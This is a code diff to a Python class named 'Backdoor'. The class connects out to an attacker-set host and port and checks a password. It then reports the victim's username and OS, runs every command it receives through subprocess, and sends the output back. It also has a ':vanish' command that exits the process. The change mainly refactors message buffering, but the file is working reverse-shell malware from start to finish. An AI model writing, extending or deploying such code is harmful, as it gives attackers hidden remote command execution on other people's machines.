@@ -8,7 +8,23 @@ class Backdoor(object):
         self.__host = host
         self.__port = port
         self.__passwd = passwd
+        self.__next_msg = list()
         self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    def __msg(self, msg):
+        self.__next_msg.append(msg)
+
+    def __send(self):
+        msg = '\n'.join(self.__next_msg)
+        self.__next_msg.clear()
+        self.__sock.send(msg.encode())
+
+    def __recv(self):
+        return self.__sock.recv(1024).decode()
+
+    def __send_and_recv(self):
+        self.__send()
+        return self.__recv()
 
     def __execute_code(self, code):
         proc = subprocess.Popen(
@@ -27,38 +43,41 @@ class Backdoor(object):
 
     def login_loop(self):
         while True:
-            self.__sock.send('Login: '.encode())
-            passwd = self.__sock.recv(1024).decode().strip()
+            self.__msg('Login: ')
+            passwd = self.__send_and_recv()
             if self.__passwd == passwd:
+                remote_login = self.__execute_code('whoami').strip()
+                remote_os = self.__execute_code('uname -a').strip()
+
+                welcome = '\n'.join([
+                    'Logged in into remote shell.',
+                    '\n',
+                    'Remote login name: ' + remote_login,
+                    'OS: ' + remote_os,
+                    '\n',
+                ])
+                self.__msg(welcome)
                 return True
+            else:
+                self.__msg('Denied.\n')
 
     def cmd_loop(self):
         while True:
-            self.__sock.send('#>'.encode())
-            data = self.__sock.recv(1024).decode().strip()
+            self.__msg('#>')
+            data = self.__send_and_recv()
 
-            if data == ':vanish':
+            if data == '':
+                continue
+            elif data == ':vanish':
                 os._exit(0)
             
             out = self.__execute_code(data)
-            self.__sock.send(out.encode())
+            self.__msg(out)
 
     def open(self):
         self.__sock.connect((self.__host, self.__port))
         if not self.login_loop():
             return
-        
-        remote_login = self.__execute_code('whoami').strip()
-        remote_os = self.__execute_code('uname -a').strip()
-
-        welcome = '\n'.join([
-            'Logged in into remote shell.',
-            '\n',
-            'Remote login name: ' + remote_login,
-            'OS: ' + remote_os,
-            '\n',
-        ])
-        self.__sock.send(welcome.encode())
         self.cmd_loop()
 
 
